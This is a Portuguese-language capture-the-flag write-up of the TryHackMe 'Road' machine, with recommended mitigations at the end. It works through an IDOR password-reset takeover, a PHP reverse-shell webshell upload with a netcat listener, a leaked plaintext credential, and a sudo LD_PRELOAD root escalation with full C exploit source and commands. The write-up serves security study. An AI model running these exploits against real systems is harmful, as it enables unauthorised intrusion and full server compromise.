# 📄 RELATÓRIO TÉCNICO – CTF ROAD (TryHackMe)

👤 **Autor:** c0rt3s
🎯 **Plataforma:** TryHackMe
🖥️ **Máquina:** Road
📌 **Tipo:** CTF – Web / Linux / Privilege Escalation
⚙️ **Objetivo:** Comprometer a aplicação web e obter acesso root no sistema
📊 **Nível de dificuldade:** Médio
🧠 **Base de estudo:** Metodologia DUNGEON + Desec Security

---

# 🎯 Objetivo do Lab

O objetivo deste laboratório foi comprometer a máquina **Road**, explorando vulnerabilidades em uma aplicação web hospedada em um servidor Linux.

Durante a exploração foram utilizadas técnicas de:

* Enumeração de serviços
* Descoberta de diretórios web
* Exploração de falha lógica (IDOR)
* Upload de arquivo malicioso (webshell)
* Execução remota de comandos (RCE)
* Extração de credenciais via banco de dados
* Escalonamento de privilégios via variável de ambiente (**LD_PRELOAD**)

A exploração resultou em acesso **root completo ao sistema**.

---

# ⚔️ Resumo da Cadeia de Ataque

```
Nmap Scan
      ↓
Enumeração Web (Gobuster)
      ↓
Descoberta /v2/admin
      ↓
Registro de usuário
      ↓
Descoberta do email admin
      ↓
Exploração IDOR (reset de senha)
      ↓
Acesso como admin
      ↓
Upload de webshell
      ↓
Shell reversa (www-data)
      ↓
Extração de credenciais via MongoDB
      ↓
Acesso SSH (webdeveloper)
      ↓
Sudo mal configurado (LD_PRELOAD)
      ↓
Escalonamento para root
      ↓
Captura das flags
```

Essa cadeia representa um **ataque clássico em aplicações web com falhas de lógica + má configuração de privilégios no sistema operacional**.

---

# 🔍 Reconhecimento Inicial – Nmap

O primeiro passo foi identificar serviços expostos na máquina alvo.

```
nmap -sC -sV -Pn -n -p- road.thm
```

Portas identificadas:

```
22/tcp  - SSH (OpenSSH 8.2p1 Ubuntu)
80/tcp  - HTTP (Apache 2.4.41)
```

Sistema operacional identificado:

```
Linux (Ubuntu)
```

---

# 🌐 Enumeração Web

Foi realizada enumeração de diretórios utilizando Gobuster.

```
gobuster dir -u http://road.thm/ -w /usr/share/wordlists/dirb/common.txt
```

Diretórios encontrados:

```
/assets
/phpMyAdmin
/v2
```

Enumeração adicional no diretório administrativo:

```
/v2/admin/
```

Arquivos relevantes:

```
login.html
register.html
ResetUser.php
lostpassword.php
profile.php
track_orders.php
```

---

# 🧠 Análise da Aplicação

A aplicação identificada (**Sky Couriers**) possui:

* Sistema de login e registro
* Painel administrativo completo
* Funcionalidade de reset de senha
* Upload de arquivos de perfil
* Consulta de pedidos via parâmetro GET

Pontos de interesse identificados:

* `lostpassword.php` → potencial falha lógica
* `ResetUser.php` → manipulação de usuários
* `profile.php` → upload de arquivos
* `track_orders.php` → possível vetor de entrada (GET)

---

# 🧨 Exploração – IDOR (Reset de Senha)

Foi identificada uma vulnerabilidade de **IDOR (Insecure Direct Object Reference)** no mecanismo de reset de senha.

### Comportamento vulnerável:

O sistema permite alterar a senha de qualquer usuário apenas modificando o parâmetro:

```
uname
```

### Exploração:

1. Criar conta válida
2. Autenticar na aplicação
3. Interceptar requisição no Burp Suite
4. Alterar:

```
uname=admin@sky.thm
```

5. Definir nova senha
6. Realizar login como administrador

---

# 🔓 Acesso Administrativo

Após exploração da vulnerabilidade, foi obtido acesso ao painel administrativo com:

```
admin@sky.thm
```

Isso permitiu acesso a funcionalidades críticas, incluindo upload de arquivos.

---

# 💻 Upload de Webshell

A funcionalidade de upload em `profile.php` permitiu envio de arquivo PHP malicioso.

Arquivo enviado:

```
php-reverse-shell.php
```

Local de armazenamento:

```
/v2/profileimages/
```

Execução do payload:

```
http://road.thm/v2/profileimages/php-reverse-shell.php
```

Listener:

```
nc -nvlp 4444
```

Resultado:

```
Shell obtida como www-data
```

---

# 🔧 Estabilização da Shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm
```

---

# 🔐 Extração de Credenciais

Durante a exploração do sistema, foi identificado acesso ao **MongoDB**, contendo credenciais em texto plano:

```
webdeveloper : BahamasChapp123!@#
```

---

# 🖥️ Acesso via SSH

Com as credenciais obtidas:

```
ssh webdeveloper@road.thm
```

Foi possível obter acesso a um usuário com mais privilégios.

---

# 🚀 Escalonamento de Privilégios

## 🔎 Análise de Sudo

Foi identificado um binário executável com permissões elevadas:

```
/usr/bin/sky_backup_utility
```

Configuração vulnerável:

```
NOPASSWD + env_keep+=LD_PRELOAD
```

---

## 🧨 Exploração com LD_PRELOAD

Foi criado um payload em C para execução com privilégios elevados.

### Código:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void exploit() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

### Compilação:

```
gcc -fPIC -shared -o exploit.so exploit.c
```

### Execução:

```
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/sky_backup_utility
```

Resultado:

```
Shell root obtida
```

---

# 🚩 Captura das Flags

```
/home/webdeveloper/user.txt
/root/root.txt
```

---

# 💥 Impacto de Segurança

Em um ambiente real, essa cadeia permitiria:

* Comprometimento completo da aplicação web
* Acesso administrativo indevido
* Execução remota de código
* Vazamento de credenciais sensíveis
* Escalonamento total para root
* Controle completo do servidor

---

# 🛡️ Mitigações Recomendadas

* Implementar controle de autorização no reset de senha (evitar IDOR)
* Validar uploads no servidor (extensão, MIME, conteúdo)
* Bloquear execução de scripts em diretórios de upload
* Remover `LD_PRELOAD` do sudo
* Utilizar caminhos absolutos em binários
* Criptografar credenciais no banco de dados
* Implementar princípio de menor privilégio

---

# 🧠 Conclusão

Este laboratório demonstrou uma cadeia de ataque bem estruturada envolvendo:

* Falha de lógica crítica (**IDOR**)
* Upload arbitrário de arquivos
* Execução remota de comandos
* Exposição de credenciais em banco de dados
* Má configuração de privilégios no sistema Linux

A exploração reforça a importância de:

* validação adequada de acesso
* controle de uploads
* hardening do sistema operacional

Além disso, evidencia como **falhas simples, quando encadeadas, levam a comprometimento total do sistema** — exatamente o tipo de cenário explorado em testes de intrusão reais.
